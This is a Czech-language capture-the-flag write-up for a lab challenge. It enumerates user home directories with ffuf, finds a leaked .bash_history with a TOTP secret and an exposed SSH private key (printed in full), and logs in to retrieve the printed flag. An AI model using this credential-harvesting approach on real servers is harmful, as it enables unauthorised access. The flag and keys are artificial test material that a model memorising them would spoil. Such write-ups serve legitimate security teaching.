# Secure Terminal Server (3)

## Zadání

Hi Senior Researcher,

the NREN-TCC research community uses a secure terminal server for running experiments and accessing computational resources. The terminal server has recently acquired a new feature, currently still in testing and not yet announced to its users: every scientist can now publish a personal homepage directly from their home directory.

It sounds convenient. Perhaps even dangerous. Take a closer look and see what can go wrong.

Stay curious!

The server sits on `home.nren.tcc`

## Nápovědy (Hints)

1. All services in `nren.tcc` domain are accessible via VPN only.
2. Nothing exotic here. Standard technologies and conventions are used.

## Řešení

Po prvotním průzkumu to vypadá, že na serveru <http://home.nren.tcc> jsou adresáře uživatelů ve formátu <http://home.nren.tcc/~...>

Zkusíme vyhledat, které jsou dostupné.

`ffuf -u http://home.nren.tcc/~FUZZ -w /usr/share/dirb/wordlists/big.txt  -fc 403`

```text
david                   [Status: 301, Size: 355, Words: 21, Lines: 10, Duration: 11ms]
john                    [Status: 301, Size: 354, Words: 21, Lines: 10, Duration: 12ms]
karen                   [Status: 301, Size: 355, Words: 21, Lines: 10, Duration: 25ms]
peter                   [Status: 301, Size: 355, Words: 21, Lines: 10, Duration: 16ms]
tom                     [Status: 301, Size: 353, Words: 21, Lines: 10, Duration: 13ms]
```

U uživatele karen jsou zajímavé soubory.

<http://home.nren.tcc/~karen/.bash_history>

```text
uname -a
cd ~
sudo apt-get install -y libpam-google-authenticator qrencode
google-authenticator -t -d -f -r 3 -R 30 -w 3
qrencode -o qr.png 'otpauth://totp/karen@nren-2fa?secret=7PCPRMSL2IMTH3KS&issuer=nren'
ssh-keygen -t ed25519 -N '' -f ~/id_ed25519 -C 'karen@nren-deploy'
cat ~/id_ed25519.pub >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
ssh -i ~/id_ed25519 karen@localhost
sudo systemctl restart ssh
rm -f qr.png
history -w
```

a <http://home.nren.tcc/~karen/id_ed25519>

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAMtFn+qLHZT72VUK3L463ZkFpKhRR9DrrGBpmrLt62sgAAAJip7xfeqe8X
3gAAAAtzc2gtZWQyNTUxOQAAACAMtFn+qLHZT72VUK3L463ZkFpKhRR9DrrGBpmrLt62sg
AAAEDwgnxU6GJecdO65FeHAf6GiDrBHR4VFGtqguHIQ/4DRQy0Wf6osdlPvZVQrcvjrdmQ
WkqFFH0OusYGmasu3rayAAAAEWthcmVuQG5yZW4tZGVwbG95AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Na serveru `home.nren.tcc` běží také ssh server.

```sh
ssh -i id_ed25519 karen@home.nren.tcc
(karen@home.nren.tcc) Verification code:
```

Verification kód neznáme, ale v `.bash_history` je uveden secret `7PCPRMSL2IMTH3KS` pro generování TOTP kódu.
Můžeme využít online Cyberchef `https://gchq.github.io/CyberChef/#recipe=Generate_TOTP('Account',6,0,30)&input=N1BDUFJNU0wySU1USDNLUyA&oenc=65001`

Po zadání vygenerovaného kódu se zobrazí flag.

## Flag

`FLAG{qPb2-qVV8-WwkZ-Kq7G}`
